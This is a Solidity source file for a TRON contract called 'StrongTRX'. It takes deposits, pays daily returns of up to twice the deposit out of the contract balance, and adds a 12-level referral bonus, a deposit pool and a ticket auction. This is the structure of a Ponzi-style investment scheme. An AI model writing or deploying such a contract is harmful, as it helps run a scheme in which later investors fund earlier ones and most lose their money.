//SourceUnit: StrongTRX.sol

pragma solidity 0.5.10;

contract StrongTRX {
    using SafeMath for uint;

    uint constant internal INVEST_MIN_AMOUNT = 200 trx;
    uint constant internal INVEST_MAX_AMOUNT = 201 trx;
    uint constant internal WITHDRAW_MIN_AMOUNT = 100 trx;
    uint constant internal DEPOSITS_MAX = 200;
    uint constant internal BASE_PERCENT = 100000;
    uint[] internal REFERRAL_PERCENTS = [2500000, 2000000, 1500000, 1200000, 1000000, 800000, 600000, 500000, 400000, 300000, 200000, 100000];
    uint[] internal DIRECT_PERCENTS = [500000, 300000];
    uint[] internal POOL_PERCENTS = [40, 30, 20, 10];
    uint[] internal AUCTION_PERCENTS = [30, 20, 10];
    uint constant internal AUCTION_MIN_AMOUNT = 25 trx;
    uint constant internal AUCTIONBONUS = 50;
    uint constant internal MARKETING_FEE = 500000;
    uint constant internal PROJECT_FEE = 500000;
    uint constant internal MAX_CONTRACT_PERCENT = 500000;
    uint constant internal MAX_HOLD_PERCENT = 400000;
    uint constant internal PERCENTS_DIVIDER = 10000000;
    uint constant internal CONTRACT_BALANCE_STEP = 1000000 trx;
    uint constant internal INVEST_MAX_AMOUNT_STEP = 50000 trx;
    uint constant internal TIME_STEP = 1 days;
    uint constant internal AUCTION_STEP = 1 hours;

    uint32 internal pLD = uint32(block.timestamp);
    uint internal pB;
    uint internal pC;
    
    uint32 internal aST = uint32(block.timestamp);
    uint internal aET = (uint(aST).add(AUCTION_STEP));
    uint internal aP;
    uint internal aLP;
    uint internal aB;
    uint internal aH;
    uint internal aPS;
    uint internal aC;
    
    uint internal totalDeposits;
    uint internal totalInvested;
    uint internal totalWithdrawn;

    uint internal contractPercent;
    uint internal contractCreation;

    address payable internal marketingAddress;
    address payable internal projectAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint24[12] refs;
        address referrer;
        uint32 checkpoint;
        uint32 lastinvest;
        uint64 dbonus;
        uint64 bonus;
        uint64 pbonus;
        uint64 bkpdivs;
        uint64 aprofit;
        uint64 waprofit;
        uint64 aparticipation;
        
    }
    mapping(uint => mapping(address => uint)) internal purds;
    mapping(uint => mapping(address => uint)) internal auds;
    mapping(uint => address) internal auctiontop;
    mapping(uint => address) internal auctionlasttop;
    mapping(uint => address) internal ptop;
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnsub;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event PoolPayout(address indexed user, uint amount);
    event WithdrawnAuction(address indexed user, uint amount);
    event AuctionPayout(address indexed user, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable marketingAddr, address payable projectAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate();
    }

function FeePayout(uint amount) internal{
    uint msgValue = amount;
    uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
    uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
    marketingAddress.transfer(marketingFee);
    projectAddress.transfer(projectFee);
    emit FeePayed(msg.sender, marketingFee.add(projectFee));
}


    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        uint InvestLimit = getCurrentInvestLimit();
        require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= InvestLimit,"Out limits deposit");
        User storage user = users[msg.sender];
        require (block.timestamp > uint(user.lastinvest).add(TIME_STEP) && user.deposits.length < DEPOSITS_MAX, "Deposits limits exceded");
        uint msgValue = msg.value;

        FeePayout (msgValue);

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
        if (user.referrer != address(0)) {
            address up = user.referrer;
            for (uint i = 0; i < 12; i++) {
                if (up != address(0)) {
                    users[up].refs[i]++;
                    up = users[up].referrer;
                } else break;
            }
        }
        
       if (user.referrer != address(0)) {
           address up = user.referrer;
        for (uint i = 0; i < 2; i++) {
                if (up != address(0)) {
                    uint amount = msgValue.mul(DIRECT_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        users[up].dbonus = uint64(uint(users[up].dbonus).add(amount));
                    }
                    up = users[up].referrer;
                } else break;
            }
        }
    
    if((uint(pLD)).add(TIME_STEP) < block.timestamp) {

        uint da = pB.div(10);

       for(uint i = 0; i < 4; i++) {
            if(ptop[i] == address(0)) break;
            uint win = da.mul(POOL_PERCENTS[i]).div(100);
            users[ptop[i]].pbonus = uint64(uint(users[ptop[i]].pbonus).add(win));
            pB = pB.sub(win);
            emit PoolPayout(ptop[i], win);
        }
        for(uint i = 0; i < 4; i++) {
            ptop[i] = address(0);
        }
        
        pLD = uint32(block.timestamp);
        pC++;
    }
    pB = pB.add(msgValue.mul(3).div(100));
    
    if (user.referrer != address(0)) {
        address up = user.referrer;
        purds[pC][up] = purds[pC][up].add(msgValue);
        for(uint i = 0; i < 4; i++) {
                if(ptop[i] == up) break;
                if(ptop[i] == address(0)) {
                ptop[i] = up;
                break;
        }    
            if(purds[pC][up] > purds[pC][ptop[i]]) {
                for(uint j = i + 1; j < 4; j++) {
                    if(ptop[j] == up) {
                        for(uint k = j; k <= 4; k++) {
                            ptop[k] = ptop[k + 1];
                        }
                        break;
                    }
                }
                for(uint j = uint(4 - 1); j > i; j--) {
                    ptop[j] = ptop[j - 1];
                }
                ptop[i] = up;
                break;
            }
        }
    }
        
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }
        user.lastinvest = uint32(block.timestamp);
        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));
        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;
        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }
        emit NewDeposit(msg.sender, msgValue);
    }

    function refPayout(uint msgValue) internal {
        User storage user = users[msg.sender];
        if (user.referrer != address(0)) {
            address up = user.referrer;
        for (uint i = 0; i < 12; i++) {
                if (up != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        users[up].bonus = uint64(uint(users[up].bonus).add(amount));
                    }
                    up = users[up].referrer;
                } else break;
            }
        }
    }
    
    function withdraw() public {
        uint cB = address(this).balance;
        User storage user = users[msg.sender];
        require (block.timestamp >= uint(user.checkpoint).add(TIME_STEP) && cB > 0, "Try Again in 24hours");
        uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;
        uint userbkp = user.bkpdivs;

         for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);
                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }
                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }
        if (uint(user.deposits[i].withdrawn).add(dividends) < uint(user.deposits[i].amount).mul(2) && user.bkpdivs > 0) {
            if(uint(user.deposits[i].withdrawn).add(dividends).add(userbkp) > uint(user.deposits[i].amount).mul(2)) {
                userbkp = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn).add(dividends));
                }
            dividends = dividends.add(userbkp);
            user.bkpdivs = 0;
        }

        uint availableLimitWithdraw = getCurrentHalfDayWithdrawAvailable();
        if (dividends > availableLimitWithdraw) {
            uint bkpdivs = dividends;    
            dividends = availableLimitWithdraw;
            user.bkpdivs = uint64(uint(bkpdivs).sub(dividends));
        }
        if (uint(user.deposits[i].withdrawn).add(dividends) < uint(user.deposits[i].amount).mul(2) && user.bonus > 0) {
            uint match_bonus = user.bonus;
            if(uint(user.deposits[i].withdrawn).add(dividends).add(match_bonus) > uint(user.deposits[i].amount).mul(2)) {
                match_bonus = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn).add(dividends));
                }
            if (match_bonus.add(dividends) > availableLimitWithdraw) {           
            match_bonus = availableLimitWithdraw.sub(dividends);
            }   
            user.bonus = uint64(uint(user.bonus).sub(match_bonus));
            dividends = dividends.add(match_bonus);
        }
        
        if (uint(user.deposits[i].withdrawn).add(dividends) < uint(user.deposits[i].amount).mul(2) && user.dbonus > 0) {
            uint direct_bonus = user.dbonus;
            if(uint(user.deposits[i].withdrawn).add(dividends).add(direct_bonus) > uint(user.deposits[i].amount).mul(2)) {
                direct_bonus = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn).add(dividends));
            }
            if (direct_bonus.add(dividends) > availableLimitWithdraw) {           
            direct_bonus = availableLimitWithdraw.sub(dividends);
            } 
            user.dbonus = uint64(uint(user.dbonus).sub(direct_bonus));
            dividends = dividends.add(direct_bonus);
            }
            
        if (uint(user.deposits[i].withdrawn).add(dividends) < uint(user.deposits[i].amount).mul(2) && user.pbonus > 0) {
            uint pool_bonus = user.pbonus;
            if(uint(user.deposits[i].withdrawn).add(dividends).add(pool_bonus) > uint(user.deposits[i].amount).mul(2)) {
                pool_bonus = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn).add(dividends));
            }
            if (pool_bonus.add(dividends) > availableLimitWithdraw) {           
            pool_bonus = availableLimitWithdraw.sub(dividends);
            } 
            user.pbonus = uint64(uint(user.pbonus).sub(pool_bonus));
            dividends = dividends.add(pool_bonus);
            }
        
            
        uint halfDayWithdrawTurnsub = turnsub[getCurrentHalfDayWithdraw()];
        uint halfDayWithdrawLimit = getCurrentDayWithdrawLimit();
        if (dividends.add(halfDayWithdrawTurnsub) < halfDayWithdrawLimit) { 
        turnsub[getCurrentHalfDayWithdraw()] = halfDayWithdrawTurnsub.add(dividends);
        }else {
            turnsub[getCurrentHalfDayWithdraw()] = halfDayWithdrawLimit;
        }
          
        user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
        totalAmount = totalAmount.add(dividends);
            }
        }
        require(totalAmount > WITHDRAW_MIN_AMOUNT, "User no minimum");
            if (cB < totalAmount) {
            totalAmount = cB;
            }   
        
        refPayout(totalAmount);
        user.checkpoint = uint32(block.timestamp);
        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
    }
    
    function Buyticket() external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        uint MinLimit = getticketcost();
        require(msg.value == MinLimit, "Check value ticket");
        User storage user = users[msg.sender];

        uint msgValue = msg.value;

    if (aET < block.timestamp) {
        uint da = aB;
        uint aBpyt = aB;
        if (aB > 0) {
        FeePayout (da);
        }
        
        if (aP > 0){
        da = da.add(aP.mul(15).div(100));
        aB = aB.add(aP.mul(15).div(100));
        aP = aP.sub(aP.mul(15).div(100));
        }
        
        aLP = da;
        
       for(uint i = 0; i < 3; i++) {
            if(auctiontop[i] != address(0)){
            uint win = da.mul(AUCTION_PERCENTS[i]).div(100);
            users[auctiontop[i]].aprofit = uint64(uint(users[auctiontop[i]].aprofit).add(win));
            aB = aB.sub(win);
            
            emit AuctionPayout(auctiontop[i], win);
        
            }
        }
        
        aP = aP.add(aBpyt.mul(10).div(100));
        aB = aB.sub(aBpyt.mul(40).div(100));

        if (aB > 0) {
                uint residual = aB;
                aP = aP.add(aB);
                aB = aB.sub(residual);
            }
        
        for(uint i = 0; i < 5; i++) {
            auctionlasttop[i] = auctiontop[i];
            if(auctiontop[i] != address(0)){
            auctiontop[i] = address(0);
            }
        }
        
        aST = uint32(block.timestamp);
        aET = (uint(aST).add(AUCTION_STEP));
        aH = 0;
        aC++;
        aPS = 0;
    }
    
    if (aH < msgValue){
            aH = msgValue;
        }
    
    if (aET.sub(10 minutes) < block.timestamp) {
            aET = (uint(aET).add(10 minutes));
    }
    
    aB = aB.add(msgValue);
    
    if (msg.sender != address(0)) {
           address up = msg.sender;
           auds[aC][up] = msgValue;
        for(uint i = 0; i < 5; i++) {
                if(auctiontop[i] == address(0)) {
                auctiontop[i] = up;
                break;
            }
            if(auds[aC][up] > auds[aC][auctiontop[i]]) {
                for(uint j = uint(5 - 1); j > i; j--) {
                    auctiontop[j] = auctiontop[j - 1];
                }
               auctiontop[i] = up;
                break;
            }
        }
        aPS++;
    }
    user.aparticipation++;
    
}

function withdrawABonus() public {
    uint totalAmount;
        User storage user = users[msg.sender];
        uint AuctionBonus = user.aprofit;
		require (AuctionBonus > 0,"No Auction Profit" );
		
		totalAmount = totalAmount.add(AuctionBonus);
		user.waprofit = uint64(uint(user.waprofit).add(AuctionBonus));
		user.aprofit = 0;
        
        uint cB = address(this).balance;
            if (cB < totalAmount) {
            totalAmount = cB;
        } 

        msg.sender.transfer(totalAmount);
        totalWithdrawn = totalWithdrawn.add(totalAmount);
        emit WithdrawnAuction(msg.sender, totalAmount);
    }
    
    function resetpools() public {
    if((uint(pLD)).add(TIME_STEP) < block.timestamp) {
        uint da = pB.div(10);
       for(uint i = 0; i < 4; i++) {
            if(ptop[i] != address(0)){
            uint win = da.mul(POOL_PERCENTS[i]).div(100);
            users[ptop[i]].pbonus = uint64(uint(users[ptop[i]].pbonus).add(win));
            pB = pB.sub(win);
            emit PoolPayout(ptop[i], win);
            }
        }
        for(uint i = 0; i < 4; i++) {
            ptop[i] = address(0);
        }
        pLD = uint32(block.timestamp);
        pC++;
    }
    
    if (aET < block.timestamp) {
        uint da = aB;
        uint aBpyt = aB;
        if (aB > 0) {
        FeePayout (da);
        }
        
        if (aP > 0){
        da = da.add(aP.mul(15).div(100));
        aB = aB.add(aP.mul(15).div(100));
        aP = aP.sub(aP.mul(15).div(100));
        }
        
        aLP = da;
        
       for(uint i = 0; i < 3; i++) {
            if(auctiontop[i] != address(0)){
            uint win = da.mul(AUCTION_PERCENTS[i]).div(100);
            users[auctiontop[i]].aprofit = uint64(uint(users[auctiontop[i]].aprofit).add(win));
            aB = aB.sub(win);
            
            emit AuctionPayout(auctiontop[i], win);
        
            }
        }
        
        aP = aP.add(aBpyt.mul(10).div(100));
        aB = aB.sub(aBpyt.mul(40).div(100));

        if (aB > 0) {
                uint residual = aB;
                aP = aP.add(aB);
                aB = aB.sub(residual);
            }
        
        for(uint i = 0; i < 5; i++) {
            auctionlasttop[i] = auctiontop[i];
            if(auctiontop[i] != address(0)){
            auctiontop[i] = address(0);
            }
        }
        
        aST = uint32(block.timestamp);
        aET = (uint(aST).add(AUCTION_STEP));
        aH = 0;
        aC++;
        aPS = 0;
    }
        
    }


    function getContractBalance() internal view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() internal view returns (uint) {
        uint cB = address(this).balance;
        uint cBPercent = BASE_PERCENT.add(cB.div(CONTRACT_BALANCE_STEP).mul(10000));
        if (cBPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return cBPercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    //Auction Rate
    function getUserAuctionRate(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint aparticipation= user.aparticipation;
            uint AMultiplier = AUCTIONBONUS.mul(aparticipation);
            return AMultiplier;

    }
    
    function getUserPercentRate(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint AMultiplier = getUserAuctionRate(userAddress);

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(2500);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier).add(AMultiplier);
        } else {
            return contractPercent.add(AMultiplier);
        }
    }
    
    function getUserAvailable(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint userPercentRate = getUserPercentRate(userAddress);
        uint userbkp = user.bkpdivs;
        uint totalDividends;
        uint dividends;
        
        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);
                } else {
                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);
                }
                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }
        if (uint(user.deposits[i].withdrawn).add(dividends) < uint(user.deposits[i].amount).mul(2) && user.bkpdivs > 0) {
            if(uint(user.deposits[i].withdrawn).add(dividends).add(userbkp) > uint(user.deposits[i].amount).mul(2)) {
                userbkp = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn).add(dividends));
                }
            dividends = dividends.add(userbkp);
        }
                totalDividends = totalDividends.add(dividends);
                /// no update of withdrawn because that is view function
            }
        }
        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) internal view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) internal view returns (uint) {
        User storage user = users[userAddress];
        uint amount;
        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }


// Withdraw system
    function getCurrentHalfDayWithdraw() internal view returns (uint) {
        return (block.timestamp.sub(contractCreation)).div(TIME_STEP);
    }

    function getCurrentDayWithdrawLimit() internal view returns (uint) {
        uint limit;
        uint currentDay = (block.timestamp.sub(contractCreation)).div(TIME_STEP);
        if (currentDay >= 0) {
            limit = totalInvested.div(10);
        }
        return limit;
    }

    function getCurrentHalfDayWithdrawTurnsub() internal view returns (uint) {
        return turnsub[getCurrentHalfDayWithdraw()];
    }

    function getCurrentHalfDayWithdrawAvailable() internal view returns (uint) {
        return getCurrentDayWithdrawLimit().sub(getCurrentHalfDayWithdrawTurnsub());
    }
 // Limit invest   
    function getCurrentInvestLimit() internal view returns (uint) {
        uint limit;
        if (totalInvested <= INVEST_MAX_AMOUNT_STEP) {
            limit = INVEST_MAX_AMOUNT;
        } else if (totalInvested >= INVEST_MAX_AMOUNT_STEP) {
            limit = totalInvested.div(10);
        }
        return limit;
    }
   //Ticket cost 
    function getDticket() internal view returns (uint) {
        uint limit;
        
        if (aPS == 0) {
            limit = AUCTION_MIN_AMOUNT;
        } else if (aPS >= 1) {
            limit = aH.add(aH.div(20));
        }
    
        return limit;
    }

    function getticketcost() internal view returns (uint) {
        uint limit;
    if (aET < block.timestamp){
        limit = AUCTION_MIN_AMOUNT;
    } else {
        limit = getDticket();
        }
        return limit;
    }
 //
    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory start = new uint[](count);
        uint index = 0;
        
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }
        return (amount, withdrawn, start);
    }


    function getSiteStats() public view returns (uint, uint, uint, uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, totalWithdrawn, address(this).balance, contractPercent, getCurrentInvestLimit(), getCurrentHalfDayWithdrawAvailable());
    }

    function getUserStats(address userAddress) public view returns ( uint, uint, uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAPerc = getUserAuctionRate(userAddress);
        uint userHPerc = userPerc.sub(contractPercent).sub(userAPerc);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userHPerc, userAPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint24[12] memory) {
        User storage user = users[userAddress];
        return (user.referrer, user.dbonus, user.bonus, user.pbonus, user.bkpdivs , user.aparticipation, user.aprofit, user.waprofit, user.refs);
    }

    
    // Pool Info
    function getpoolTopInfo() public view returns (address[] memory, uint[] memory, uint, uint, uint, uint) {
        address[] memory addr = new address[](4);
        uint[] memory deps = new uint[](4);
        
        for (uint i = 0; i < 4; i++) {
            addr[i] = address(ptop[i]);
            deps[i] = uint(purds[pC][ptop[i]]);
        }
        return (addr, deps, pLD, pB, pC, block.timestamp);
    }
    
    //Auction Info
    function getpoolAuctInfo() public view returns (address[] memory, address[] memory, uint[] memory, uint, uint, uint, uint, uint, uint, uint, uint) {
        address[] memory addr = new address[](5);
        address[] memory addrs = new address[](5);
        uint[] memory deps = new uint[](5);
        
        for (uint i = 0; i < 5; i++) {
            addr[i] = address(auctionlasttop[i]);
            addrs[i] = address(auctiontop[i]);
            deps[i] = uint(auds[aC][auctiontop[i]]);
        }
        return (addr, addrs, deps, aST, aET, aP, aB, aPS , aLP, getticketcost(), aC);
    }
    

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}